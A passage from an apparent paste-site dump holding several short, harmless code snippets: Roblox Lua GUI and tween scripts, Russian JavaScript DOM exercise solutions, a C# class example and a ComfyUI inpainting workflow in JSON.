    [Enum.MessageType.MessageOutput] = Color3.fromRGB(255, 255, 255),
    [Enum.MessageType.MessageInfo] = Color3.fromRGB(70, 130, 180),
    [Enum.MessageType.MessageWarning] = Color3.fromRGB(255, 193, 7),
    [Enum.MessageType.MessageError] = Color3.fromRGB(220, 53, 69)
}

-- Message type names
local messageTypeNames = {
    [Enum.MessageType.MessageOutput] = ""output"",
    [Enum.MessageType.MessageInfo] = ""info"",
    [Enum.MessageType.MessageWarning] = ""warning"",
    [Enum.MessageType.MessageError] = ""error""
}

-- Function to create message entry
local function createMessageEntry(message, messageType, timestamp)
    local messageFrame = Instance.new(""Frame"")
    messageFrame.Name = ""MessageEntry""
    messageFrame.Size = UDim2.new(1, -10, 0, 0)
    messageFrame.BackgroundTransparency = 1
    messageFrame.BorderSizePixel = 0
    messageFrame.LayoutOrder = messageCount
    
    local messageLabel = Instance.new(""TextLabel"")
    messageLabel.Name = ""MessageLabel""
    messageLabel.Size = UDim2.new(1, 0, 1, 0)
    messageLabel.BackgroundTransparency = 1
    messageLabel.Text = string.format(""[%s] %s"", timestamp, message)
    messageLabel.TextColor3 = messageColors[messageType] or Color3.fromRGB(255, 255, 255)
    messageLabel.TextSize = 12
    messageLabel.Font = Enum.Font.SourceSans
    messageLabel.TextXAlignment = Enum.TextXAlignment.Left
    messageLabel.TextYAlignment = Enum.TextYAlignment.Top
    messageLabel.TextWrapped = true
    messageLabel.RichText = true
    messageLabel.Parent = messageFrame
    
    -- Calculate text height
    local textSize = game:GetService(""TextService""):GetTextSize(
        messageLabel.Text,
        messageLabel.TextSize,
        messageLabel.Font,
        Vector2.new(ScrollingFrame.AbsoluteSize.X - 20, math.huge)
    )
    
    messageFrame.Size = UDim2.new(1, -10, 0, math.max(textSize.Y + 4, 16))
    
    -- Store message type for filtering
    messageFrame:SetAttribute(""MessageType"", messageTypeNames[messageType] or ""output"")
    
    return messageFrame
end

-- Function to add message to GUI
local function addMessage(message, messageType, timestamp)
    local messageEntry = createMessageEntry(message, messageType, timestamp)
    messageEntry.Parent = ScrollingFrame
    
    messageCount = messageCount + 1
    outputMessages[messageCount] = {frame = messageEntry, type = messageTypeNames[messageType] or ""output""}
    
    -- Memory management - remove old messages
    if messageCount > maxMessages then
        local oldMessage = outputMessages[messageCount - maxMessages]
        if oldMessage and oldMessage.frame then
            oldMessage.frame:Destroy()
        end
        outputMessages[messageCount - maxMessages] = nil
    end
    
    -- Update canvas size
    RunService.Heartbeat:Wait()
    ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, OutputList.AbsoluteContentSize.Y + 10)
    
    -- Auto-scroll to bottom
    ScrollingFrame.CanvasPosition = Vector2.new(0, ScrollingFrame.CanvasSize.Y.Offset)
end

-- Function to filter messages
local function filterMessages()
    for _, messageData in pairs(outputMessages) do
        if messageData.frame and messageData.frame.Parent then
            local messageType = messageData.type
            local filterData = filterButtons[messageType]
            
            if filterData then
                messageData.frame.Visible = filterData.enabled
            else
                messageData.frame.Visible = filterButtons.info.enabled -- Default to info filter
            end
        end
    end
    
    -- Update canvas size after filtering
    RunService.Heartbeat:Wait()
    ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, OutputList.AbsoluteContentSize.Y + 10)
end

-- Function to clear all messages
local function clearMessages()
    for _, messageData in pairs(outputMessages) do
        if messageData.frame then
            messageData.frame:Destroy()
        end
    end
    outputMessages = {}
    messageCount = 0
    ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
end

-- Function to toggle minimize
local function toggleMinimize()
    isMinimized = not isMinimized
    
    local targetSize = isMinimized and UDim2.new(0, 600, 0, 30) or UDim2.new(0, 600, 0, 400)
    local targetPos = isMinimized and UDim2.new(0.5, -300, 0, 10) or UDim2.new(0.5, -300, 0.5, -200)
    
    local tween = TweenService:Create(MainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quart), {
        Size = targetSize,
        Position = targetPos
    })
    tween:Play()
    
    OutputFrame.Visible = not isMinimized
    ControlsFrame.Visible = not isMinimized
    MinimizeButton.Text = isMinimized and ""+"" or ""-""
end

-- Event connections
ClearButton.MouseButton1Click:Connect(clearMessages)
MinimizeButton.MouseButton1Click:Connect(toggleMinimize)
CloseButton.MouseButton1Click:Connect(function()
    OutputCaptureGUI:Destroy()
end)

-- Filter button connections
for filterName, filterData in pairs(filterButtons) do
    filterData.button.MouseButton1Click:Connect(function()
        filterData.enabled = not filterData.enabled
        filterData.button.BackgroundColor3 = filterData.enabled and filterData.color or Color3.fromRGB(60, 60, 60)
        filterMessages()
    end)
end

-- LogService connection for capturing output
local logConnection = LogService.MessageOut:Connect(function(message, messageType)
    local timestamp = os.date(""%H:%M:%S"")
    addMessage(message, messageType, timestamp)
end)

-- Cleanup on GUI destruction
OutputCaptureGUI.AncestryChanged:Connect(function()
    if not OutputCaptureGUI.Parent then
        if logConnection then
            logConnection:Disconnect()
        end
    end
end)

-- Initial message
addMessage(""Output Capture GUI initialized successfully!"", Enum.MessageType.MessageInfo, os.date(""%H:%M:%S""))

print(""Output Capture GUI loaded! Use the interface to monitor all Roblox output."")"
BPZSN89K,JS. Усложненные задачи. Решения,Hasli4,JavaScript,Thursday 12th of June 2025 11:40:59 AM CDT,"
## Решения

```js
// Задача 1: Счётчик кликов
const ctrBtn = document.querySelector('#counter-btn');
const ctrDisplay = document.querySelector('#counter');
let count = 0;
ctrBtn.addEventListener('click', function() {
  count++;
  ctrDisplay.textContent = count;
});

// Задача 2: Список дел
const todoInput = document.querySelector('#todo-input');
const addBtn = document.querySelector('#add-btn');
const todoList = document.querySelector('#todo-list');
addBtn.addEventListener('click', function() {
  const text = todoInput.value.trim();
  todoInput.value = '';
  if (!text) return;
  const li = document.createElement('li');
  li.textContent = text + ' ';
  const del = document.createElement('button');
  del.textContent = 'Удалить';
  li.appendChild(del);
  todoList.appendChild(li);
  del.addEventListener('click', function() {
    todoList.removeChild(li);
  });
});

// Задача 3: Галерея
const mainImg = document.querySelector('#main-image');
const thumbs = document.querySelectorAll('.thumb');
thumbs.forEach(function(tn) {
  tn.addEventListener('click', function() {
    mainImg.src = tn.src;
  });
});

// Задача 4: Карточки
const cards = document.querySelectorAll('.card');
const countSpan = document.querySelector('#count');
let selectedCount = 0;
cards.forEach(function(c) {
  c.addEventListener('click', function() {
    if (c.classList.contains('selected')) {
      c.classList.remove('selected');
      c.style.backgroundColor = '';
      selectedCount--;
    } else {
      c.classList.add('selected');
      c.style.backgroundColor = 'lightblue';
      selectedCount++;
    }
    countSpan.textContent = selectedCount;
  });
});

// Задача 5: Загрузка с задержкой
const loadBtn = document.querySelector('#load');
const content = document.querySelector('#content');
loadBtn.addEventListener('click', function() {
  content.textContent = 'Загрузка…';
  setTimeout(function() {
    content.textContent = 'Данные загружены';
    const p = document.createElement('p');
    p.textContent = 'Вот какие-то данные...';
    content.appendChild(p);
  }, 2000);
});
```"
LuNjGqHy,Работа с классами,AziLif,C#,Thursday 12th of June 2025 11:18:46 AM CDT,"using System;

namespace ConsoleApp
{
    class Program
    {
        static void Main(string[] args)
        {
            Player hunter = new Player(""Кро-Кро"", 987, 123.7f);

            hunter.ShowInfo();
        }
    }

    class Player
    {
        private string _name;
        private int _age;
        private float _bodyWeight;

        public Player(string name, int age, float bodyWeight)
        {
            _name = name;
            _age = age;
            _bodyWeight = bodyWeight;
        }

        public void ShowInfo()
        {
            Console.WriteLine($""Наш игрок: \nЕго имя - {_name}, возраст - {_age}, масса тела - {_bodyWeight} "");
        }
    }
}"
9iemYzs4,Project 4 - CloseShop (Client),BoblokDevelopyyyr,Lua,Thursday 12th of June 2025 11:05:45 AM CDT,"local button = script.Parent
local player = game.Players.LocalPlayer
local shopGui = player.PlayerGui.ShopGui
local shopFrame = shopGui.ShopFrame

button.MouseButton1Click:Connect(function()
	if shopFrame.Visible then
		shopFrame.Visible = false
	end
end)"
3KiT0uXk,Project 4 - OpenShop (Server),BoblokDevelopyyyr,Lua,Thursday 12th of June 2025 11:04:58 AM CDT,"local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
local events = ReplicatedStorage.Events
local ShopEvent = events.ShopGUIEvent

local shopPart = workspace.ShopPart
local shopPartPrompt = shopPart.ShopPrompt

shopPartPrompt.Triggered:Connect(function(player)
	ShopEvent:FireClient(player)
	print(""Event sent from Server!"")
end)"
U2QCY1tj,Project 4 - OpenShop (Client),BoblokDevelopyyyr,Lua,Thursday 12th of June 2025 11:04:36 AM CDT,"local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
local events = ReplicatedStorage.Events
local ShopEvent = events.ShopGUIEvent

local player = game.Players.LocalPlayer
local playerGui = player.PlayerGui
local shopFrame = playerGui:WaitForChild(""ShopGui"").ShopFrame
ShopEvent.OnClientEvent:Connect(function()
	shopFrame.Visible = true
	print(""Event recieved on client!"")
end)"
MK9hxnYT,ComfyUI Chroma | Inpaint,MunchkinT,JSON,Thursday 12th of June 2025 11:01:28 AM CDT,"{
  ""id"": ""cef6b23d-f408-4892-9266-4ae762966658"",
  ""revision"": 0,
  ""last_node_id"": 31,
  ""last_link_id"": 95,
  ""nodes"": [
    {
      ""id"": 4,
      ""type"": ""RandomNoise"",
      ""pos"": [
        -21,
        122
      ],
      ""size"": [
        315,
        82
      ],
      ""flags"": {},
      ""order"": 0,
      ""mode"": 0,
      ""inputs"": [],
      ""outputs"": [
        {
          ""name"": ""NOISE"",
          ""type"": ""NOISE"",
          ""links"": [
            3
          ]
        }
      ],
      ""properties"": {
        ""cnr_id"": ""comfy-core"",
        ""ver"": ""0.3.33"",
        ""Node name for S&R"": ""RandomNoise"",
        ""widget_ue_connectable"": {
          ""noise_seed"": true
        }
      },
      ""widgets_values"": [
        1028267308013065,
        ""randomize""
      ],
      ""color"": ""#2a363b"",
      ""bgcolor"": ""#3f5159""
    },
    {
      ""id"": 2,
      ""type"": ""VAEDecode"",
      ""pos"": [
        888,
        261
      ],
      ""size"": [
        210,
        46
      ],
      ""flags"": {},
      ""order"": 18,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""samples"",
          ""type"": ""LATENT"",
          ""link"": 1
        },
        {
          ""name"": ""vae"",
          ""type"": ""VAE"",
          ""link"": null
        }
      ],
      ""outputs"": [
        {
          ""name"": ""IMAGE"",
          ""type"": ""IMAGE"",
          ""slot_index"": 0,
          ""links"": [
            27
          ]
        }
      ],
      ""properties"": {
        ""cnr_id"": ""comfy-core"",
        ""ver"": ""0.3.33"",
        ""Node name for S&R"": ""VAEDecode"",
        ""widget_ue_connectable"": {}
      },
      ""widgets_values"": [],
      ""color"": ""#323"",
      ""bgcolor"": ""#535""
    },
    {
      ""id"": 22,
      ""type"": ""SaveImage"",
      ""pos"": [
        1153.8553466796875,
        807.2567138671875
      ],
      ""size"": [
        315,
        270
      ],
      ""flags"": {
        ""pinned"": true
      },
      ""order"": 19,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""images"",
          ""type"": ""IMAGE"",
          ""link"": 27
        }
      ],
      ""outputs"": [],
      ""properties"": {
        ""cnr_id"": ""comfy-core"",
        ""ver"": ""0.3.33"",
        ""Node name for S&R"": ""SaveImage"",
        ""widget_ue_connectable"": {
          ""filename_prefix"": true
        }
      },
      ""widgets_values"": [
        ""ComfyUI""
      ]
    },
    {
      ""id"": 21,
      ""type"": ""LoadAndResizeImage"",
      ""pos"": [
        792.201171875,
        505.04608154296875
      ],
      ""size"": [
        349.9201354980469,
        574.8799438476562
      ],
      ""flags"": {
        ""pinned"": true
      },
      ""order"": 1,
      ""mode"": 0,
      ""inputs"": [],
      ""outputs"": [
        {
          ""name"": ""image"",
          ""type"": ""IMAGE"",
          ""links"": [
            25
          ]
        },
        {
          ""name"": ""mask"",
          ""type"": ""MASK"",
          ""links"": [
            26
          ]
        },
        {
          ""name"": ""width"",
          ""type"": ""INT"",
          ""links"": null
        },
        {
          ""name"": ""height"",
          ""type"": ""INT"",
          ""links"": null
        },
        {
          ""name"": ""image_path"",
          ""type"": ""STRING"",
          ""links"": null
        }
      ],
      ""properties"": {
        ""cnr_id"": ""comfyui-kjnodes"",
        ""ver"": ""1.1.0"",
        ""Node name for S&R"": ""LoadAndResizeImage"",
        ""widget_ue_connectable"": {
          ""image"": true,
          ""resize"": true,
          ""width"": true,
          ""height"": true,
          ""repeat"": true,
          ""keep_proportion"": true,
          ""divisible_by"": true,
          ""mask_channel"": true,
          ""background_color"": true
        }
      },
      ""widgets_values"": [
        ""clipspace/clipspace-mask-52192978.1.png [input]"",
        false,
        512,
        512,
        1,
        false,
        2,
        ""alpha"",
        """",
        ""image""
      ]
    },
    {
      ""id"": 15,
      ""type"": ""CLIPTextEncode"",
      ""pos"": [
        -848,
        305
      ],
      ""size"": [
        395.4634704589844,
        126.71954345703125
      ],
      ""flags"": {},
      ""order"": 13,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""clip"",
          ""type"": ""CLIP"",
          ""link"": 80
        }
      ],
      ""outputs"": [
        {
          ""name"": ""CONDITIONING"",
          ""type"": ""CONDITIONING"",
          ""links"": [
            73
          ]
        }
      ],
      ""properties"": {
        ""cnr_id"": ""comfy-core"",
        ""ver"": ""0.3.33"",
        ""Node name for S&R"": ""CLIPTextEncode"",
        ""widget_ue_connectable"": {
          ""text"": true
        }
      },
      ""widgets_values"": [
        ""Hot lady in a skimpy official dress""
      ],
      ""color"": ""#232"",
      ""bgcolor"": ""#353""
    },
    {
      ""id"": 11,
      ""type"": ""CLIPTextEncode"",
      ""pos"": [
        -849.8599853515625,
        519.1925048828125
      ],
      ""size"": [
        400,
        200
      ],
      ""flags"": {
        ""collapsed"": true
      },
      ""order"": 14,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""clip"",
          ""type"": ""CLIP"",
          ""link"": 81
        }
      ],
      ""outputs"": [
        {
          ""name"": ""CONDITIONING"",
          ""type"": ""CONDITIONING"",
          ""links"": [
            11
          ]
        }
      ],
      ""properties"": {
        ""cnr_id"": ""comfy-core"",
        ""ver"": ""0.3.33"",
        ""Node name for S&R"": ""CLIPTextEncode"",
        ""widget_ue_connectable"": {
          ""text"": true
        }
      },
      ""widgets_values"": [
        """"
      ],
      ""color"": ""#2a363b"",
      ""bgcolor"": ""#3f5159""
    },
    {
      ""id"": 20,
      ""type"": ""Anything Everywhere"",
      ""pos"": [
        -1025.1754150390625,
        164.98245239257812
      ],
      ""size"": [
        210,
        46
      ],
      ""flags"": {
        ""collapsed"": true
      },
      ""order"": 12,
      ""mode"": 0,
      ""inputs"": [
        {
          ""color_on"": ""#B39DDB"",
          ""label"": ""MODEL"",
          ""name"": ""MODEL"",
          ""shape"": 7,
          ""type"": ""*"",
          ""link"": 94
        }
      ],
      ""outputs"": [],
      ""properties"": {
        ""cnr_id"": ""cg-use-everywhere"",
        ""ver"": ""6.0.4"",
        ""Node name for S&R"": ""Anything Everywhere"",
        ""group_restricted"": 0,
        ""color_restricted"": 0,
        ""widget_ue_connectable"": {}
      },
      ""widgets_values"": [],
      ""color"": ""#332922"",
      ""bgcolor"": ""#593930""
    },
    {
      ""id"": 6,
      ""type"": ""DifferentialDiffusion"",
      ""pos"": [
        -489.6860046386719,
        228.87661743164062
      ],
      ""size"": [
        210,
        26
      ],
      ""flags"": {},
      ""order"": 2,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""model"",
          ""type"": ""MODEL"",
          ""link"": null
        }
      ],
      ""outputs"": [
        {
          ""name"": ""MODEL"",
          ""type"": ""MODEL"",
          ""links"": [
            76,
            77
          ]
        }
      ],
      ""properties"": {
        ""cnr_id"": ""comfy-core"",
        ""ver"": ""0.3.33"",
        ""Node name for S&R"": ""DifferentialDiffusion"",
        ""widget_ue_connectable"": {}
      },
      ""widgets_values"": [],
      ""color"": ""#2a363b"",
      ""bgcolor"": ""#3f5159""
    },
    {
      ""id"": 7,
      ""type"": ""KSamplerSelect"",
      ""pos"": [
        -30,
        390
      ],
      ""size"": [
        315,
        58
      ],
      ""flags"": {},
      ""order"": 3,
      ""mode"": 0,
      ""inputs"": [],
      ""outputs"": [
        {
          ""name"": ""SAMPLER"",
          ""type"": ""SAMPLER"",
          ""links"": [
            6
          ]
        }
      ],
      ""properties"": {
        ""cnr_id"": ""comfy-core"",
        ""ver"": ""0.3.33"",
        ""Node name for S&R"": ""KSamplerSelect"",
        ""widget_ue_connectable"": {
          ""sampler_name"": true
        }
      },
      ""widgets_values"": [
        ""euler""
      ],
      ""color"": ""#2a363b"",
      ""bgcolor"": ""#3f5159""
    },
    {
      ""id"": 29,
      ""type"": ""CFGGuider"",
      ""pos"": [
        -26.75132179260254,
        666.7158203125
      ],
      ""size"": [
        315,
        98
      ],
      ""flags"": {},
      ""order"": 16,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""model"",
          ""type"": ""MODEL"",
          ""link"": 77
        },
        {
          ""name"": ""positive"",
          ""type"": ""CONDITIONING"",
          ""link"": 74
        },
        {
          ""name"": ""negative"",
          ""type"": ""CONDITIONING"",
          ""link"": 75
        }
      ],
      ""outputs"": [
        {
          ""name"": ""GUIDER"",
          ""type"": ""GUIDER"",
          ""links"": [
            78
          ]
        }
      ],
      ""properties"": {
        ""cnr_id"": ""comfy-core"",
        ""ver"": ""0.3.30"",
        ""Node name for S&R"": ""CFGGuider"",
        ""widget_ue_connectable"": {}
      },
      ""widgets_values"": [
        4.5
      ]
    },
    {
      ""id"": 28,
      ""type"": ""T5TokenizerOptions"",
      ""pos"": [
        -1070.50537109375,
        -73.9698486328125
      ],
      ""size"": [
        210,
        82
      ],
      ""flags"": {},
      ""order"": 11,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""clip"",
          ""type"": ""CLIP"",
          ""link"": 95
        }
      ],
      ""outputs"": [
        {
          ""name"": ""CLIP"",
          ""type"": ""CLIP"",
          ""links"": [
            80,
            81
          ]
        }
      ],
      ""properties"": {
        ""cnr_id"": ""comfy-core"",
        ""ver"": ""0.3.37"",
        ""Node name for S&R"": ""T5TokenizerOptions"",
        ""widget_ue_connectable"": {}
      },
      ""widgets_values"": [
        1,
        0
      ]
    },
    {
      ""id"": 8,
      ""type"": ""BasicScheduler"",
      ""pos"": [
        -30,
        490
      ],
      ""size"": [
        315,
        106
      ],
      ""flags"": {},
      ""order"": 9,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""model"",
          ""type"": ""MODEL"",
          ""link"": 76
        }
      ],
      ""outputs"": [
        {
          ""name"": ""SIGMAS"",
          ""type"": ""SIGMAS"",
          ""links"": [
            7
          ]
        }
      ],
      ""properties"": {
        ""cnr_id"": ""comfy-core"",
        ""ver"": ""0.3.33"",
        ""Node name for S&R"": ""BasicScheduler"",
        ""widget_ue_connectable"": {
          ""scheduler"": true,
          ""steps"": true,
          ""denoise"": true
        }
      },
      ""widgets_values"": [
        ""simple"",
        20,
        0.8200000000000002
      ],
      ""color"": ""#2a363b"",
      ""bgcolor"": ""#3f5159""
    },
    {
      ""id"": 1,
      ""type"": ""SamplerCustomAdvanced"",
      ""pos"": [
        403.3896484375,
        247.3291473388672
      ],
      ""size"": [
        355.20001220703125,
        554.5205078125
      ],
      ""flags"": {},
      ""order"": 17,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""noise"",
          ""type"": ""NOISE"",
          ""link"": 3
        },
        {
          ""name"": ""guider"",
          ""type"": ""GUIDER"",
          ""link"": 78
        },
        {
          ""name"": ""sampler"",
          ""type"": ""SAMPLER"",
          ""link"": 6
        },
        {
          ""name"": ""sigmas"",
          ""type"": ""SIGMAS"",
          ""link"": 7
        },
        {
          ""name"": ""latent_image"",
          ""type"": ""LATENT"",
          ""link"": 8
        }
      ],
      ""outputs"": [
        {
          ""name"": ""output"",
          ""type"": ""LATENT"",
          ""slot_index"": 0,
          ""links"": [
            1
          ]
        },
        {
          ""name"": ""denoised_output"",
          ""type"": ""LATENT"",
          ""links"": null
        }
      ],
      ""properties"": {
        ""cnr_id"": ""comfy-core"",
        ""ver"": ""0.3.33"",
        ""Node name for S&R"": ""SamplerCustomAdvanced"",
        ""widget_ue_connectable"": {}
      },
      ""widgets_values"": [],
      ""color"": ""#323"",
      ""bgcolor"": ""#535""
    },
    {
      ""id"": 9,
      ""type"": ""InpaintModelConditioning"",
      ""pos"": [
        -360.87548828125,
        691.5425415039062
      ],
      ""size"": [
        216.59999084472656,
        138
      ],
      ""flags"": {},
      ""order"": 15,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""positive"",
          ""type"": ""CONDITIONING"",
          ""link"": 73
        },
        {
          ""name"": ""negative"",
          ""type"": ""CONDITIONING"",
          ""link"": 11
        },
        {
          ""name"": ""vae"",
          ""type"": ""VAE"",
          ""link"": null
        },
        {
          ""name"": ""pixels"",
          ""type"": ""IMAGE"",
          ""link"": null
        },
        {
          ""name"": ""mask"",
          ""type"": ""MASK"",
          ""link"": 12
        }
      ],
      ""outputs"": [
        {
          ""name"": ""positive"",
          ""type"": ""CONDITIONING"",
          ""slot_index"": 0,
          ""links"": [
            74
          ]
        },
        {
          ""name"": ""negative"",
          ""type"": ""CONDITIONING"",
          ""links"": [
            75
          ]
        },
        {
          ""name"": ""latent"",
          ""type"": ""LATENT"",
          ""slot_index"": 2,
          ""links"": [
            8
          ]
        }
      ],
      ""properties"": {
        ""cnr_id"": ""comfy-core"",
        ""ver"": ""0.3.33"",
        ""Node name for S&R"": ""InpaintModelConditioning"",
        ""widget_ue_connectable"": {
          ""noise_mask"": true
        }
      },
      ""widgets_values"": [
        true
      ],
      ""color"": ""#223"",
      ""bgcolor"": ""#335""
    },
    {
      ""id"": 12,
      ""type"": ""ImpactGaussianBlurMask"",
      ""pos"": [
        -717.2888793945312,
        874.5679321289062
      ],
      ""size"": [
        315,
        82
      ],
      ""flags"": {},
      ""order"": 8,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""mask"",
          ""type"": ""MASK"",
          ""link"": 26
        }
      ],
      ""outputs"": [
        {
          ""name"": ""MASK"",
          ""type"": ""MASK"",
          ""links"": [
            12
          ]
        }
      ],
      ""properties"": {
        ""cnr_id"": ""comfyui-impact-pack"",
        ""ver"": ""8.14.2"",
        ""Node name for S&R"": ""ImpactGaussianBlurMask"",
        ""widget_ue_connectable"": {
          ""kernel_size"": true,
          ""sigma"": true
        }
      },
      ""widgets_values"": [
        10,
        10
      ],
      ""color"": ""#223"",
      ""bgcolor"": ""#335""
    },
    {
      ""id"": 14,
      ""type"": ""Anything Everywhere"",
      ""pos"": [
        -721,
        810
      ],
      ""size"": [
        210,
        46
      ],
      ""flags"": {
        ""collapsed"": true
      },
      ""order"": 7,
      ""mode"": 0,
      ""inputs"": [
        {
          ""color_on"": ""#64B5F6"",
          ""label"": ""IMAGE"",
          ""name"": ""IMAGE"",
          ""shape"": 7,
          ""type"": ""*"",
          ""link"": 25
        }
      ],
      ""outputs"": [],
      ""properties"": {
        ""cnr_id"": ""cg-use-everywhere"",
        ""ver"": ""6.0.4"",
        ""Node name for S&R"": ""Anything Everywhere"",
        ""group_restricted"": 0,
        ""color_restricted"": 0,
        ""widget_ue_connectable"": {}
      },
      ""widgets_values"": [],
      ""color"": ""#223"",
      ""bgcolor"": ""#335""
    },
    {
      ""id"": 18,
      ""type"": ""Anything Everywhere"",
      ""pos"": [
        -1660,
        410
      ],
      ""size"": [
        210,
        46
      ],
      ""flags"": {
        ""collapsed"": true
      },
      ""order"": 10,
      ""mode"": 0,
      ""inputs"": [
        {
          ""color_on"": ""#FF6E6E"",
          ""label"": ""VAE"",
          ""name"": ""VAE"",
          ""shape"": 7,
          ""type"": ""*"",
          ""link"": 18
        }
      ],
      ""outputs"": [],
      ""properties"": {
        ""cnr_id"": ""cg-use-everywhere"",
        ""ver"": ""6.0.4"",
        ""Node name for S&R"": ""Anything Everywhere"",
        ""group_restricted"": 0,
        ""color_restricted"": 0,
        ""widget_ue_connectable"": {}
      },
      ""widgets_values"": [],
      ""color"": ""#332922"",
      ""bgcolor"": ""#593930""
    },
    {
      ""id"": 17,
      ""type"": ""VAELoader"",
      ""pos"": [
        -1770,
        270
      ],
      ""size"": [
        315,
        58
      ],
      ""flags"": {},
      ""order"": 4,
      ""mode"": 0,
      ""inputs"": [],
      ""outputs"": [
        {
          ""name"": ""VAE"",
          ""type"": ""VAE"",
          ""slot_index"": 0,
          ""links"": [
            18
          ]
        }
      ],
      ""properties"": {
        ""cnr_id"": ""comfy-core"",
        ""ver"": ""0.3.33"",
        ""Node name for S&R"": ""VAELoader"",
        ""widget_ue_connectable"": {
          ""vae_name"": true
        }
      },
      ""widgets_values"": [
        ""ae.safetensors""
      ],
      ""color"": ""#332922"",
      ""bgcolor"": ""#593930""
    },
    {
      ""id"": 31,
      ""type"": ""CLIPLoader"",
      ""pos"": [
        -1438.0023193359375,
        -226.02560424804688
      ],
      ""size"": [
        270,
        106
      ],
      ""flags"": {},
      ""order"": 5,
      ""mode"": 0,
      ""inputs"": [],
      ""outputs"": [
        {
          ""name"": ""CLIP"",
          ""type"": ""CLIP"",
          ""links"": [
            95
          ]
        }
      ],
      ""properties"": {
        ""cnr_id"": ""comfy-core"",
        ""ver"": ""0.3.40"",
        ""Node name for S&R"": ""CLIPLoader"",
        ""widget_ue_connectable"": {}
      },
      ""widgets_values"": [
        ""t5xxl_enconly.safetensors"",
        ""chroma"",
        ""default""
      ]
    },
    {
      ""id"": 30,
      ""type"": ""UNETLoader"",
      ""pos"": [
        -1462.882568359375,
        -56.00956726074219
      ],
      ""size"": [
        315,
        82
      ],
      ""flags"": {},
      ""order"": 6,
      ""mode"": 0,
      ""inputs"": [],
      ""outputs"": [
        {
          ""name"": ""MODEL"",
          ""type"": ""MODEL"",
          ""slot_index"": 0,
          ""links"": [
            94
          ]
        }
      ],
      ""properties"": {
        ""cnr_id"": ""comfy-core"",
        ""ver"": ""0.3.33"",
        ""Node name for S&R"": ""UNETLoader"",
        ""widget_ue_connectable"": {
          ""unet_name"": true,
          ""weight_dtype"": true
        }
      },
      ""widgets_values"": [
        ""chroma_v27.safetensors"",
        ""fp8_e4m3fn""
      ],
      ""color"": ""#332922"",
      ""bgcolor"": ""#593930""
    }
  ],
  ""links"": [
    [
      1,
      1,
      0,
      2,
      0,
      ""LATENT""
    ],
    [
      3,
      4,
      0,
      1,
      0,
      ""NOISE""
    ],
    [
      6,
      7,
      0,
      1,
      2,
      ""SAMPLER""
    ],
    [
      7,
      8,
      0,
      1,
      3,
      ""SIGMAS""
    ],
    [
      8,
      9,
      2,
      1,
      4,
      ""LATENT""
    ],
    [
      11,
      11,
      0,
      9,
      1,
      ""CONDITIONING""
    ],
    [
      12,
      12,
      0,
      9,
      4,
      ""MASK""
    ],
    [
      18,
      17,
      0,
      18,
      0,
      ""VAE""
    ],
    [
      25,
      21,
      0,
      14,
      0,
      ""IMAGE""
    ],
    [
      26,
      21,
      1,
      12,
      0,
      ""MASK""
    ],
    [
      27,
      2,
      0,
      22,
      0,
      ""IMAGE""
    ],
    [
      73,
      15,
      0,
      9,
      0,
      ""CONDITIONING""
    ],
    [
      74,
      9,
      0,
      29,
      1,
      ""CONDITIONING""
    ],
    [
      75,
      9,
      1,
      29,
      2,
      ""CONDITIONING""
    ],
    [
      76,
      6,
      0,
      8,
      0,
      ""MODEL""
    ],
    [
      77,
      6,
      0,
      29,
      0,
      ""MODEL""
    ],
    [
      78,
      29,
      0,
      1,
      1,
      ""GUIDER""
    ],
    [
      80,
      28,
      0,
      15,
      0,
      ""CLIP""
    ],
    [
      81,
      28,
      0,
      11,
      0,
      ""CLIP""
    ],
    [
      94,
      30,
      0,
      20,
      0,
      ""MODEL""
    ],
    [
      95,
      31,
      0,
      28,
      0,
      ""CLIP""
    ]
  ],
  ""groups"": [],
  ""config"": {},
  ""extra"": {
    ""ds"": {
      ""scale"": 0.876922695000009,
      ""offset"": [
        1962.71927169676,
        193.56378412209173
      ]
    },
    ""ue_links"": [
      {
        ""downstream"": 2,
        ""downstream_slot"": 1,
        ""upstream"": ""17"",
        ""upstream_slot"": 0,
        ""controller"": 18,
        ""type"": ""VAE""
      },
      {
        ""downstream"": 6,
        ""downstream_slot"": 0,
        ""upstream"": ""30"",
        ""upstream_slot"": 0,
        ""controller"": 20,
        ""type"": ""MODEL""
      },
      {
        ""downstream"": 9,
        ""downstream_slot"": 2,
        ""upstream"": ""17"",
        ""upstream_slot"": 0,
        ""controller"": 18,
        ""type"": ""VAE""
      },
      {
        ""downstream"": 9,
        ""downstream_slot"": 3,
        ""upstream"": ""21"",
        ""upstream_slot"": 0,
        ""controller"": 14,
        ""type"": ""IMAGE""
      }
    ],
    ""groupNodes"": {},
    ""links_added_by_ue"": [
      90,
      91,
      92,
      93
    ],
    ""frontendVersion"": ""1.22.1"",
    ""VHS_latentpreview"": true,
    ""VHS_latentpreviewrate"": 0,
    ""VHS_MetadataImage"": true,
    ""VHS_KeepIntermediate"": true
  },
  ""version"": 0.4
}"
6Aq2HQCn,InsideAPart - Project 3,BoblokDevelopyyyr,Lua,Thursday 12th of June 2025 10:47:27 AM CDT,"task.wait(2)
local TweenService = game:GetService(""TweenService"")
local part = script.Parent

local goal = {
	Position = Vector3.new(-21.3, 5, -30.7),
	Size = Vector3.new(10, 10, 10)
}	

local tweenInfo = TweenInfo.new(
	5,
	Enum.EasingStyle.Cubic,
	Enum.EasingDirection.Out,
	0,
	false,
	0
)

local tween = TweenService:Create(part, tweenInfo, goal)
tween:Play()"
4D8fH3rq,InsideAPart - Project 2,BoblokDevelopyyyr,Lua,Thursday 12th of June 2025 10:47:04 AM CDT,"local part = script.Parent


local linearVelocity = Instance.new(""LinearVelocity"", part)
linearVelocity.VectorVelocity = Vector3.new(0, 20, 0)
linearVelocity.MaxForce = 1000000

